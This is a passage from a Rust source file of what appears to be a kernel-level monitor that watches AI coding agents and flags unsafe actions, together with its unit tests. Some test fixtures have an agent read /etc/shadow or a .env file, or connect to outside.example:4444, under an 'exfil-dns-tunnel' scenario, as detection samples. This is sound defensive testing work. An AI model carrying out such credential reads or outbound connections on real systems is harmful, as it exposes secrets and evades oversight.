                            // The runtime is the terminal analyzer: it
                            // consumes the stream and forwards raw events
                            // live instead of accumulating them. Buffering
                            // here made `/api/live/events` silent for the
                            // whole run and left the buffer unread on the
                            // shutdown path.
                            if let Some(tx) = &self.raw_event_tx {
                                let _ = tx.send(event.clone());
                            }
                            self.last_event_at = Some(Instant::now());
                            let _ = self.route_event(&event);
                            self.event_count += 1;
                            self.dirty = true;
                            if self.event_count.is_multiple_of(self.config.trigger_every_n) {
                                self.trigger().await;
                            }
                        }
                        None => {
                            self.finalize_session(&run_id).await;
                            break;
                        }
                    }
                }
                _ = tick.tick() => {
                    if self.dirty {
                        self.trigger().await;
                    }
                }
                _ = shutdown_poll.tick() => {
                    if RUNTIME_SHUTDOWN.load(Ordering::Relaxed) {
                        if let Some(health) = &self.terminal_health
                            && let Ok(mut health) = health.lock()
                        { health.stopped = true; }
                        // Stop helpers first so they detach probes, flush
                        // aggregations, and publish final loss counters. A
                        // quiet interval is not EOF: a helper can be waiting
                        // for its poll timeout before emitting its last rows.
                        crate::framework::runners::common::request_helper_shutdown();
                        let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(5);
                        loop {
                            match tokio::time::timeout_at(
                                deadline,
                                input.next(),
                            )
                            .await
                            {
                                Ok(Some(event)) => {
                                    if let Some(tx) = &self.raw_event_tx {
                                        let _ = tx.send(event.clone());
                                    }
                                    self.last_event_at = Some(Instant::now());
                                    let _ = self.route_event(&event);
                                    self.event_count += 1;
                                    self.dirty = true;
                                }
                                Ok(None) => break,
                                Err(_) => break,
                            }
                        }
                        self.finalize_session(&run_id).await;
                        break;
                    }
                }
            }
        }

        // Terminal analyzer: no downstream consumer. The runner's stream ends
        // when the input ends, which is what main.rs waits for.
        Ok(Box::pin(futures::stream::empty()))
    }
}

/// The logical identity `ClaimId::from_key` hashes.
fn claim_logical_key(
    claim: &crate::responsibility::types::alert_types::ResponsibilityClaim,
) -> (String, String, String, String) {
    (
        claim.subject.as_str().to_string(),
        claim.policy_id.as_str().to_string(),
        claim.boundary_id.as_str().to_string(),
        format!("{:?}", claim.claim_type),
    )
}

/// Optional cap on phase-2 Observer batches. `0`/unset means unlimited.
fn observer_batch_cap() -> Option<usize> {
    std::env::var("MTAGENTLENS_MAX_OBSERVER_BATCHES")
        .ok()
        .and_then(|value| value.parse::<usize>().ok())
        .filter(|limit| *limit > 0)
}

fn batch_cap_reached(batch: usize, cap: Option<usize>) -> bool {
    cap.is_some_and(|limit| batch >= limit)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::framework::core::events::Event;
    use crate::responsibility::observer::mock::MockObserverProvider;
    use crate::responsibility::persistence::writer::{PersistenceWriter, WriterConfig};
    use serde_json::json;
    use tokio::sync::broadcast;

    #[test]
    fn harness_indexer_file_events_are_dropped_but_agent_file_events_are_kept() {
        let prefixes = vec!["ioq-".to_string()];
        let indexer = Event::new_with_timestamp(
            1,
            "process".into(),
            10,
            "ioq-3".into(),
            json!({"event": "FILE_OPEN", "filepath": "/repo/a.rs"}),
        );
        assert!(ignored_file_comm_matches(&prefixes, &indexer));
        let agent = Event::new_with_timestamp(
            2,
            "process".into(),
            11,
            "python3".into(),
            json!({"event": "FILE_OPEN", "filepath": "/tmp/f/config/.env"}),
        );
        assert!(!ignored_file_comm_matches(&prefixes, &agent));
        let exec = Event::new_with_timestamp(
            3,
            "process".into(),
            10,
            "ioq-3".into(),
            json!({"event": "EXEC", "filename": "/usr/bin/ioq"}),
        );
        assert!(!ignored_file_comm_matches(&prefixes, &exec));
    }

    fn runtime_with_db(db_path: &std::path::Path) -> ResponsibilityRuntime {
        let writer = PersistenceWriter::new(WriterConfig {
            db_path: db_path.to_string_lossy().to_string(),
            ..WriterConfig::default()
        })
        .expect("writer");
        let (alert_tx, _alert_rx) = broadcast::channel(8);
        ResponsibilityRuntime::new(
            RuntimeConfig::default(),
            writer,
            alert_tx,
            Box::new(MockObserverProvider::with_responses(Vec::new())),
        )
    }

    fn graph_table_count(db_path: &std::path::Path, table: &str) -> i64 {
        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .expect("open persisted database");
        conn.query_row(&format!("SELECT count(*) FROM {table}"), [], |row| {
            row.get(0)
        })
        .unwrap()
    }
    /// The phase-1 gate must allow both paths and reject a bare claim with no
    /// identifiable agent. This is the product contract the online evaluation
    /// depends on (an Unsafe Observer verdict is actionable even without a PBC
    /// claim; a claim alone is not).
    #[test]
    fn alert_gate_matrix() {
        assert!(alert_gate_allows(true, 1, false));
        assert!(alert_gate_allows(true, 0, true));
        assert!(alert_gate_allows(false, 0, true));
        assert!(!alert_gate_allows(false, 3, false));
        assert!(!alert_gate_allows(true, 0, false));
    }

    /// Console duration must come from the measured session start, not a
    /// constant zero; an unknown start stays zero instead of being invented,
    /// and a reversed clock saturates.
    #[test]
    fn elapsed_millis_requires_a_known_start_and_saturates() {
        assert_eq!(elapsed_millis(None, 5_000_000), 0);
        assert_eq!(elapsed_millis(Some(9_000_000), 1_000_000), 0);
        assert_eq!(elapsed_millis(Some(1_000_000), 1_500_000), 0);
        assert_eq!(elapsed_millis(Some(1_000_000), 2_000_000), 1);
        assert_eq!(elapsed_millis(Some(1_000_000), 4_999_999), 3);
    }

    #[test]
    fn observer_batch_cap_is_optional_and_fail_closed() {
        assert!(!super::batch_cap_reached(0, None));
        assert!(!super::batch_cap_reached(31, Some(32)));
        assert!(super::batch_cap_reached(32, Some(32)));
        assert!(super::batch_cap_reached(33, Some(32)));
    }

    #[tokio::test]
    async fn init_session_records_the_start_used_for_the_console_duration() {
        let directory = tempfile::tempdir().unwrap();
        let db_path = directory.path().join("duration.db");
        let mut runtime = runtime_with_db(&db_path);
        assert!(runtime.run_started_ns.is_none());
        let before = current_time_ns();
        let run_id = runtime.init_session();
        let started = runtime.run_started_ns.expect("session start recorded");
        assert!(before <= started && started <= current_time_ns());
        runtime.persistence.flush().await.expect("flush");
        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .expect("open");
        let stored: Option<i64> = conn
            .query_row(
                "SELECT started_at_ns FROM runs WHERE run_id = ?1",
                [&run_id],
                |row| row.get(0),
            )
            .expect("query");
        assert_eq!(stored, Some(started as i64));
    }

    #[tokio::test]
    async fn tls_events_increment_the_tls_diagnostic_counter() {
        let dir = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&dir.path().join("diag.db"));

        let tls = Event::new_with_timestamp(
            1,
            "tls_capture".into(),
            42,
            "claude".into(),
            json!({ "connection_id": 7 }),
        );
        runtime.route_event(&tls);

        let other = Event::new_with_timestamp(
            2,
            "system".into(),
            42,
            "claude".into(),
            json!({ "cpu": 0.1 }),
        );
        runtime.route_event(&other);

        assert_eq!(runtime.diag_tls_count, 1);
    }

    #[tokio::test]
    async fn request_session_hints_are_optional_and_account_ids_never_enter_the_signal_map() {
        for (body, expected) in [
            (json!({"messages": []}), None),
            (
                json!({"metadata": {"user_id": json!({"account_uuid": "same-account"}).to_string()}}),
                None,
            ),
            (
                json!({"metadata": {"user_id": json!({"session_id": "actual-session",
                "account_uuid": "same-account"}).to_string()}}),
                Some("actual-session"),
            ),
            (
                json!({"session_id": "session-one", "metadata": {"session_id": "session-two"}}),
                None,
            ),
        ] {
            let dir = tempfile::tempdir().unwrap();
            let mut runtime = runtime_with_db(&dir.path().join("sessions.db"));
            runtime.route_event(&Event::new_with_timestamp(
                1,
                "ssl".into(),
                42,
                "claude".into(),
                json!({"message_type": "request", "body": body.to_string()}),
            ));
            let snapshot = runtime.signal_graph.snapshot();
            let mut actual: Vec<_> = snapshot.conversation_ids().map(String::as_str).collect();
            actual.sort_unstable();
            assert_eq!(
                actual,
                expected.into_iter().collect::<Vec<_>>(),
                "body: {body}"
            );
        }
    }

    #[test]
    fn alert_emission_record_has_exact_links_and_epoch_timestamps() {
        let claims = vec!["claim-exact-1".to_string(), "claim-exact-2".to_string()];
        let record =
            alert_emission_record("alert-exact", &claims, "authoritative", 100, 125, false);
        assert_eq!(record["alert_id"], "alert-exact");
        assert_eq!(record["claim_ids"], serde_json::json!(claims));
        assert_eq!(record["phase"], "authoritative");
        assert_eq!(record["created_epoch_ns"], 100);
        assert_eq!(record["emitted_epoch_ns"], 125);
        assert_eq!(record["broadcast_delivered"], false);
        assert_eq!(record.as_object().unwrap().len(), 6);
    }

    #[test]
    fn graph_update_latency_has_separate_samples() {
        let mut latency = LatencySamples::default();
        latency.record_graph_update(std::time::Duration::from_micros(7));
        let summary = latency.summary();
        assert_eq!(summary["graph_update"]["count"], 1);
        assert_eq!(summary["graph_update"]["p50_us"], 7);
        assert_eq!(summary["graph_update"]["total_count"], 1);
        assert_eq!(summary["graph_update"]["total_ns"], 7000);
        assert_eq!(summary["trigger"]["count"], 0);
    }

    #[tokio::test]
    async fn latency_samples_are_recorded_for_routed_events() {
        let dir = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&dir.path().join("latency.db"));
        for i in 0..3 {
            let event = Event::new_with_timestamp(
                i,
                "tls_capture".into(),
                1,
                "claude".into(),
                json!({ "connection_id": i }),
            );
            runtime.route_event(&event);
        }
        let summary = runtime.latency.summary();
        assert_eq!(summary["route_event"]["count"], 3);
        assert!(summary["route_event"]["p50_us"].as_u64().is_some());
        assert_eq!(summary["trigger"]["count"], 0);
    }

    /// An empty stream still initializes a session and finalizes it: the run
    /// row must exist and carry an end timestamp, so "no events" is
    /// distinguishable from "run never started".
    #[tokio::test]
    async fn empty_stream_writes_run_start_and_run_end() {
        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("session.db");
        let mut runtime = runtime_with_db(&db_path);

        let stream: EventStream = Box::pin(futures::stream::empty());
        runtime.process(stream).await.expect("process");
        runtime.persistence.flush().await.expect("flush");

        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .expect("open");
        let (runs, ended): (i64, Option<i64>) = conn
            .query_row("SELECT COUNT(*), MAX(ended_at_ns) FROM runs", [], |row| {
                Ok((row.get(0)?, row.get(1)?))
            })
            .expect("query");
        assert_eq!(runs, 1);
        assert!(ended.is_some(), "finalize must write RunEnd");
    }

    /// The run's final verdict is aggregated from phase-1 observations even
    /// when the static score is zero and no agent can be attributed. Before
    /// this, phase 2 re-derived `Safe` from the score and contradicted the
    /// Observer's `Unsafe`.
    #[tokio::test]
    async fn terminal_health_records_completed_routing_and_final_stop() {
        let directory = tempfile::tempdir().unwrap();
        let health = std::sync::Arc::new(std::sync::Mutex::new(
            crate::framework::health::TerminalHealth::default(),
        ));
        let mut runtime = runtime_with_db(&directory.path().join("health.db"))
            .with_terminal_health(health.clone());
        assert!(!health.lock().unwrap().is_ready());
        let event = Event::new("system".into(), 1234, "test".into(), serde_json::json!({}));
        runtime.route_event(&event);
        assert_eq!(health.lock().unwrap().events_processed, 1);
        assert!(health.lock().unwrap().is_ready());
        runtime.finalize().await;
        assert!(!health.lock().unwrap().is_ready());
        assert_eq!(
            health.lock().unwrap().snapshot()["p99_processing_us"],
            serde_json::Value::Null
        );
    }

    /// Capture quality needs to know what the probe actually observed, not
    /// only that it lost nothing. These counts are the coverage half.
    fn claim_for(
        subject: &str,
        policy: &str,
    ) -> crate::responsibility::types::alert_types::ResponsibilityClaim {
        use crate::responsibility::types::alert_types::AlertSeverity;
        use crate::responsibility::types::alert_types::{
            ResponsibilityClaim, ResponsibilityClaimState, ResponsibilityClaimType,
        };
        use crate::responsibility::types::{
            AgentId, BoundaryId, ClaimId, PhaseIndicator, PolicyId,
        };
        ResponsibilityClaim {
            claim_id: ClaimId::from("c1"),
            claim_type: ResponsibilityClaimType::PolicyViolation,
            subject: AgentId::from(subject),
            policy_id: PolicyId::from(policy),
            boundary_id: BoundaryId::from("b1"),
            claim_state: ResponsibilityClaimState::Confirmed,
            severity: AlertSeverity::Warning,
            confidence: 0.7,
            evidence_refs: Vec::new(),
            competing_explanations: Vec::new(),
            traceback_ref: None,
            phase: PhaseIndicator::Authoritative {
                timestamp_ns: 1,
                overrides: None,
            },
        }
    }

    #[test]
    fn claim_refinement_key_matches_rebuilt_claim_not_evidence() {
        use crate::responsibility::types::alert_types::AlertSeverity;
        // Phase 1 and phase 2 may carry different evidence/severity/state for
        // the same logical claim; the key must not depend on those.
        let mut phase1 = claim_for("agent-a", "POLICY-1");
        phase1.confidence = 0.4;
        phase1.severity = AlertSeverity::Info;
        let phase2 = claim_for("agent-a", "POLICY-1");
        assert_eq!(claim_logical_key(&phase1), claim_logical_key(&phase2));

        let other = claim_for("agent-b", "POLICY-1");
        assert_ne!(claim_logical_key(&phase1), claim_logical_key(&other));
        let other_policy = claim_for("agent-a", "POLICY-2");
        assert_ne!(claim_logical_key(&phase1), claim_logical_key(&other_policy));
    }

    #[tokio::test]
    async fn a_user_task_installs_a_capability_envelope() {
        use crate::responsibility::types::{
            Intent, IntentAuthoritySource, IntentClass, IntentId, IntentParseState, MessageId,
            NormalizedArg, ProcessId,
        };
        let directory = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&directory.path().join("envelope.db"));
        let process = ProcessId::new(9001, 1);
        let identity = runtime
            .identity_resolver
            .resolve_provisional(process, &runtime.signal_graph.snapshot());
        runtime.graph_buffer.intents.push(Intent {
            intent_id: IntentId::from("intent-prompt"),
            process_id: process,
            message_id: MessageId::from("msg-1"),
            tool_name: "UserPrompt".into(),
            tool_args: vec![NormalizedArg::Content(
                "Summarize the release notes.".into(),
            )],
            intent_class: IntentClass::Unknown,
            parse_state: IntentParseState::Complete,
            primary_matching_eligible: true,
            authority_source: IntentAuthoritySource::TextFallback,
            timestamp_ns: 2,
            native_tool_call: None,
            declared_conversation_id: None,
        });

        runtime.install_capability_envelopes();

        assert!(
            runtime.envelopes.contains_key(&identity.agent_id),
            "a user task must install an envelope for its agent"
        );
        assert!(
            runtime
                .graph_builder
                .envelopes()
                .contains_key(&identity.agent_id),
            "the graph builder must receive the same envelope"
        );
        let frozen = runtime
            .task_envelopes
            .get(&IntentId::from("intent-prompt"))
            .expect("the exact envelope must be frozen under its source intent");
        assert_eq!(
            Some(frozen),
            runtime.envelopes.get(&identity.agent_id),
            "the reconstruction snapshot and the live grant are the same value"
        );
    }

    #[tokio::test]
    async fn a_non_user_intent_does_not_install_an_envelope() {
        use crate::responsibility::types::{
            Intent, IntentAuthoritySource, IntentClass, IntentId, IntentParseState, MessageId,
            NormalizedArg, ProcessId,
        };
        let directory = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&directory.path().join("no-envelope.db"));
        let process = ProcessId::new(9002, 1);
        runtime
            .identity_resolver
            .resolve_provisional(process, &runtime.signal_graph.snapshot());
        runtime.graph_buffer.intents.push(Intent {
            intent_id: IntentId::from("intent-read"),
            process_id: process,
            message_id: MessageId::from("msg-1"),
            tool_name: "Read".into(),
            tool_args: vec![NormalizedArg::Path("/tmp/report.md".into())],
            intent_class: IntentClass::Unknown,
            parse_state: IntentParseState::Complete,
            primary_matching_eligible: true,
            authority_source: IntentAuthoritySource::TextFallback,
            timestamp_ns: 2,
            native_tool_call: None,
            declared_conversation_id: None,
        });

        runtime.install_capability_envelopes();

        assert!(runtime.envelopes.is_empty());
    }

    #[tokio::test]
    async fn init_session_records_the_scenario_and_mode() {
        let directory = tempfile::tempdir().unwrap();
        let db_path = directory.path().join("context.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.scenario_id = Some("exfil-dns-tunnel".into());
        runtime.config.run_mode = Some("single_agent".into());

        let run_id = runtime.init_session();
        runtime.persistence.flush().await.expect("flush");

        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .expect("open");
        let (scenario_id, mode): (Option<String>, Option<String>) = conn
            .query_row(
                "SELECT scenario_id, mode FROM runs WHERE run_id = ?1",
                [&run_id],
                |row| Ok((row.get(0)?, row.get(1)?)),
            )
            .expect("run row");
        assert_eq!(scenario_id.as_deref(), Some("exfil-dns-tunnel"));
        assert_eq!(mode.as_deref(), Some("single_agent"));
    }

    #[tokio::test]
    async fn route_event_counts_observed_events_per_source() {
        let directory = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&directory.path().join("counts.db"));
        for source in ["process", "process", "ssl"] {
            runtime.route_event(&Event::new(
                source.into(),
                10,
                "agent".into(),
                serde_json::json!({}),
            ));
        }
        assert_eq!(runtime.source_counts.get("process"), Some(&2));
        assert_eq!(runtime.source_counts.get("ssl"), Some(&1));
        assert_eq!(runtime.source_counts.get("system"), None);
    }

    #[tokio::test]
    async fn capture_health_notifications_do_not_establish_observation_coverage() {
        let directory = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&directory.path().join("health-only.db"));
        for source in ["process", "ssl"] {
            let output = runtime.route_event(&Event::new(
                source.into(),
                0,
                "capture-health".into(),
                serde_json::json!({"event": "CAPTURE_HEALTH", "health": {"status": "healthy"}}),
            ));
            assert!(output.is_empty());
            assert_eq!(runtime.source_counts.get(source), None);
        }
    }

    #[tokio::test]
    async fn successful_sensitive_open_has_identical_live_and_replayed_facts() {
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::replay::checkpoint::{AnalysisCheckpoint, CHECKPOINT_KIND};
        use crate::responsibility::types::*;
        let directory = tempfile::tempdir().unwrap();
        let path = directory.path().join("opened.db");
        let mut runtime = runtime_with_db(&path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();
        let now = current_time_ns();
        let process = ProcessId::new(9234, now);
        runtime.signal_graph.observe_exec(
            process,
            ProcessId::new(1, 1),
            crate::responsibility::signals::signal_snapshot::ProcessExecInfo {
                comm: "claude".into(),
                ..Default::default()
            },
            None,
            now,
        );
        let snapshot = runtime.signal_graph.snapshot();
        runtime
            .identity_resolver
            .resolve_provisional(process, &snapshot);
        let intent = Intent {
            intent_id: IntentId::new(),
            process_id: process,
            message_id: MessageId::new(),
            tool_name: "Read".into(),
            tool_args: vec![NormalizedArg::Path("/etc/shadow".into())],
            intent_class: IntentClass::SideEffect,
            parse_state: IntentParseState::Complete,
            primary_matching_eligible: true,
            authority_source: IntentAuthoritySource::HttpResponseToolUse,
            timestamp_ns: now,
            native_tool_call: None,
            declared_conversation_id: None,
        };
        let mut action = crate::responsibility::evidence::ActionClassifier::classify(
            "openat",
            &["/etc/shadow".into(), "0".into()],
            process,
            now + 1,
        )
        .unwrap();
        action.outcome = ActionOutcome::Succeeded;
        action.syscall_ret = Some(3);
        runtime
            .evidence_correlator
            .on_intent(intent.clone(), &snapshot);
        for evidence in runtime
            .evidence_correlator
            .on_action(action.clone(), &snapshot)
        {
            runtime.graph_buffer.push_evidence(evidence);
        }
        runtime.graph_buffer.push_intent(intent);
        runtime.graph_buffer.push_action(action);
        runtime.trigger().await;
        assert!(
            runtime.latency.summary()["graph_update"]["count"]
                .as_u64()
                .unwrap()
                > 0
        );
        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();
        let reader = PersistenceReader::open(&path.to_string_lossy()).unwrap();
        let (_, payload) = reader
            .get_analysis_checkpoint(&run_id, CHECKPOINT_KIND)
            .unwrap()
            .unwrap();
        let checkpoint: AnalysisCheckpoint = serde_json::from_value(payload).unwrap();
        checkpoint.validate(&run_id).unwrap();

        // Every rejection branch must actually reject: a checkpoint recorded
        // by another analysis implementation, another contract, or with a
        // dangling edge cannot be replayed as isomorphic.
        let mut wrong_contract = checkpoint.clone();
        wrong_contract.contract = "different-contract".into();
        assert!(wrong_contract.validate(&run_id).is_err());
        let mut wrong_implementation = checkpoint.clone();
        wrong_implementation.implementation = "0000".into();
        assert!(wrong_implementation.validate(&run_id).is_err());
        let mut dangling = checkpoint.clone();
        if let Some(edge) = dangling.graph.edges.first_mut() {
            edge.source = crate::responsibility::types::NodeId::from("missing-node");
        }
        assert!(dangling.validate(&run_id).is_err());

        // Claims are persisted before the alert; read them back and check the
        // alert links to the exact persisted claim id. A broken INSERT or a
        // dropped evidence_refs column must fail here.
        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &path.to_string_lossy(),
        )
        .expect("open");
        let (claim_id, refs_json, _state, claim_run, traceback_ref): (
            String,
            String,
            String,
            String,
            Option<String>,
        ) = conn
            .query_row(
                "SELECT claim_id, evidence_refs_json, claim_state, run_id, traceback_ref \
                 FROM responsibility_claims WHERE run_id = ?1 LIMIT 1",
                [&run_id],
                |row| {
                    Ok((
                        row.get(0)?,
                        row.get(1)?,
                        row.get(2)?,
                        row.get(3)?,
                        row.get(4)?,
                    ))
                },
            )
            .expect("the sensitive open must persist a claim");
        let refs: Vec<String> = serde_json::from_str(&refs_json).unwrap();
        assert!(!refs.is_empty(), "persisted claim lost its evidence refs");
        assert_eq!(claim_run, run_id);
        let traceback_ref =
            traceback_ref.expect("finalized claim must reference the traceback it persisted");
        let (traceback_claim, traceback_run): (String, String) = conn
            .query_row(
                "SELECT claim_id, run_id FROM responsibility_tracebacks \
                 WHERE traceback_id = ?1",
                [&traceback_ref],
                |row| Ok((row.get(0)?, row.get(1)?)),
            )
            .expect("the finalized claim must point at an emitted traceback");
        assert_eq!(traceback_claim, claim_id);
        assert_eq!(traceback_run, run_id);
        let engine_json: String = conn
            .query_row(
                "SELECT engine_section_json FROM responsibility_alerts WHERE run_id = ?1 LIMIT 1",
                [&run_id],
                |row| row.get(0),
            )
            .expect("the sensitive open must persist an alert");
        let engine: serde_json::Value = serde_json::from_str(&engine_json).unwrap();
        let linked: Vec<&str> = engine["claim_ids"]
            .as_array()
            .map(|ids| ids.iter().filter_map(|id| id.as_str()).collect())
            .unwrap_or_default();
        assert!(
            linked.contains(&claim_id.as_str()),
            "alert must reference the persisted claim {claim_id}, got {linked:?}"
        );
        // Strict replay consumes the frozen checkpoint, not the legacy graph
        // tables. A finalized run therefore needs exactly one graph_snapshots
        // row and no duplicated per-trigger graph rows.
        assert_eq!(graph_table_count(&path, "graph_nodes"), 0);
        assert_eq!(graph_table_count(&path, "graph_edges"), 0);
        let snapshot_count: i64 = conn
            .query_row(
                "SELECT count(*) FROM graph_snapshots WHERE run_id = ?1",
                [run_id.as_str()],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(snapshot_count, 1);

        let live = checkpoint.evaluate();
        let replay =
            crate::responsibility::replay::ReplayExecutor::reauthoritative(&reader, &run_id)
                .unwrap();
        assert_eq!(replay.final_verdict, live.verdict);
        assert_eq!(replay.run_metrics, live.run_metrics);
        assert_eq!(replay.final_verdict.decision, AlertDecision::Unsafe);
        assert_eq!(replay.evidence.len(), 1);
        assert_eq!(replay.classification.score, live.classification.score);
        assert_eq!(replay.claim_diagnostics, live.diagnostics);
        assert_eq!(replay.claims.len(), live.claims.len());
        assert_eq!(replay.evaluation.traceback_count, replay.tracebacks.len());
        for claim in &replay.claims {
            let attached = claim
                .traceback_ref
                .as_ref()
                .expect("replayed claim must reference its emitted traceback");
            let traceback = replay
                .tracebacks
                .iter()
                .find(|traceback| &traceback.traceback_id == attached)
                .expect("replayed claim ref must resolve inside the same result");
            assert_eq!(traceback.claim_id, claim.claim_id);
        }
        assert!(
            replay
                .frozen_graph
                .edges
                .iter()
                .filter(|edge| edge.edge_type == ResponsibilityEdgeType::IntentCausesAction)
                .all(|edge| edge.operation == Some(ActionCandidateType::FileOpen))
        );
        assert!(
            replay
                .alerts
                .iter()
                .all(|alert| !alert.summary.contains("read /etc/shadow"))
        );
    }

    #[tokio::test]
    async fn behavioral_scoring_uses_owned_actions_even_without_a_correlated_graph() {
        use crate::responsibility::types::{
            Action, ActionCandidateType, ActionOutcome, CandidateDerivationMode, NormalizedArg,
            SignalClass,
        };
        let directory = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&directory.path().join("behavior.db"));
        runtime.config.disable_observer = true;
        let process = ProcessId::new(8111, 10);
        let identity = runtime
            .identity_resolver
            .resolve_provisional(process, &runtime.signal_graph.snapshot());
        for index in 0..60 {
            runtime.graph_buffer.push_action(Action {
                action_id: ActionId::from(format!("normal-{index}")),
                process_id: process,
                action_type: ActionCandidateType::FileRead,
                normalized_args: vec![NormalizedArg::Path("/work/source.rs".into())],
                derivation_mode: CandidateDerivationMode::Direct,
                signal_class: SignalClass::HighSignal,
                timestamp_ns: index + 1,
                outcome: ActionOutcome::Succeeded,
                syscall_ret: Some(12),
                syscall_name: Some("read".into()),
            });
        }
        runtime.trigger().await;
        assert!(
            runtime
                .baseline_tracker
                .get(identity.agent_id.as_str())
                .is_some_and(|baseline| baseline.is_established()),
            "resolved OS actions must train their owner even before intent correlation"
        );
        let mut unusual = runtime.graph_buffer.actions[0].clone();
        unusual.action_id = ActionId::from("new-connect");
        unusual.syscall_name = Some("connect".into());
        unusual.normalized_args = vec![NormalizedArg::Url {
            host: "outside.example".into(),
            port: Some(4444),
        }];
        runtime.graph_buffer.push_action(unusual);
        runtime.trigger().await;
        let dim6 = runtime
            .progressive_scorer
            .agents
            .get(&identity.agent_id)
            .map(|state| state.dims[5].ewma)
            .unwrap_or(0.0);
        assert!(dim6 > 0.0, "the current D6 update must reach the scorer");
        assert!(
            runtime.last_progressive_fused > 0.0,
            "the published fused score must include the current D6 update"
        );
    }

    #[tokio::test]
    async fn session_does_not_seed_kernel_identities_from_unverified_proc_ticks() {
        let dir = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&dir.path().join("no-guessed-bootstrap.db"));
        runtime.init_session();
        assert_eq!(runtime.signal_graph.snapshot().metrics().process_count, 0);
    }

    #[tokio::test]
    async fn kernel_namespace_capture_is_bounded_source_scoped_and_reset_per_session() {
        let dir = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&dir.path().join("bounded-map.db"));
        runtime.init_session();
        let mut event = Event::new(
            "ssl".into(),
            55,
            "client".into(),
            serde_json::json!({
                "event":"EXEC", "pid":55, "start_time_ns":111,
                "pid_namespace":{"device":5,"inode":4026533000u64,"tgid":17},
                "pid_namespace_error":0
            }),
        );
        runtime.persist_raw_event(&event);
        assert!(runtime.process_namespace_mappings.is_empty());
        event.source = "process".into();
        runtime.persist_raw_event(&event);
        assert_eq!(runtime.process_namespace_mappings.len(), 1);
        runtime.init_session();
        assert!(runtime.process_namespace_mappings.is_empty());
        runtime.process_namespace_mappings =
            (0..8192).map(|i| format!("{{\"index\":{i}}}")).collect();
        runtime.persist_raw_event(&event);
        assert_eq!(runtime.process_namespace_mappings.len(), 8192);
        assert_eq!(runtime.process_namespace_mapping_dropped, 1);
    }

    #[tokio::test]
    async fn initial_snapshot_is_frozen_separately_from_execution_witnesses() {
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::replay::checkpoint::CHECKPOINT_KIND;
        let dir = tempfile::tempdir().unwrap();
        let db = dir.path().join("initial-snapshot.db");
        let mut runtime = runtime_with_db(&db);
        let run_id = runtime.init_session();
        let event = Event::new(
            "process".into(),
            55,
            "resident".into(),
            serde_json::json!({
                "event":"PROCESS_SNAPSHOT", "pid":55, "start_time_ns":111,
                "timestamp":222, "ppid":1, "parent_start_time_ns":10,
                "monitor_pid_namespace":null, "monitor_pid_namespace_error":-61,
                "pid_namespace":{"device":5,"inode":4026533000u64,"tgid":17},
                "pid_namespace_error":0
            }),
        );
        runtime.persist_raw_event(&event);
        runtime.persist_raw_event(&event);
        assert!(runtime.process_namespace_mappings.is_empty());
        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();
        let reader = PersistenceReader::open(&db.to_string_lossy()).unwrap();
        let (_, payload) = reader
            .get_analysis_checkpoint(&run_id, CHECKPOINT_KIND)
            .unwrap()
            .unwrap();
        let snapshot = &payload["capture_quality"]["initial_process_snapshot"];
        assert_eq!(snapshot["schema"], "mtagentlens.kernel-process-snapshot/v1");
        assert_eq!(snapshot["records"].as_array().unwrap().len(), 1);
        assert_eq!(snapshot["records"][0]["kernel_timestamp_ns"], 222);
        assert_eq!(snapshot["records"][0]["monitor_pid_namespace_error"], -61);
        assert!(
            payload["capture_quality"]["process_namespace_mappings"]["records"]
                .as_array()
                .unwrap()
                .is_empty()
        );
        runtime.init_session();
        assert!(runtime.initial_process_snapshot.is_empty());
    }

    #[tokio::test]
    async fn kernel_namespace_mappings_are_frozen_without_detector_identity_assignment() {
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::replay::checkpoint::CHECKPOINT_KIND;
        let dir = tempfile::tempdir().unwrap();
        let db = dir.path().join("kernel-map.db");
        let mut runtime = runtime_with_db(&db);
        let run_id = runtime.init_session();
        let event = Event::new(
            "process".into(),
            55,
            "client".into(),
            serde_json::json!({
                "event":"EXEC", "pid":55, "start_time_ns":111,
                "pid_namespace":{"device":5,"inode":4026533000u64,"tgid":17},
                "pid_namespace_error":0
            }),
        );
        runtime.persist_raw_event(&event);
        runtime.persist_raw_event(&event);
        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();
        let reader = PersistenceReader::open(&db.to_string_lossy()).unwrap();
        let (_, payload) = reader
            .get_analysis_checkpoint(&run_id, CHECKPOINT_KIND)
            .unwrap()
            .unwrap();
        let mappings = &payload["capture_quality"]["process_namespace_mappings"];
        assert_eq!(mappings["schema"], "mtagentlens.kernel-process-mappings/v2");
        assert_eq!(mappings["dropped"], 0);
        assert_eq!(mappings["records"].as_array().unwrap().len(), 1);
        assert_eq!(mappings["records"][0]["pid"], 55);
        assert_eq!(mappings["records"][0]["pid_namespace"]["tgid"], 17);
        assert!(mappings["records"][0].get("agent_id").is_none());
    }

    #[tokio::test]
    async fn finalize_freezes_pre_resolver_identity_input_with_captured_message() {
        use crate::responsibility::identity::{
            IDENTITY_BOUNDARY_POLICY_SCHEMA, RAW_IDENTITY_INPUT_SCHEMA,
        };
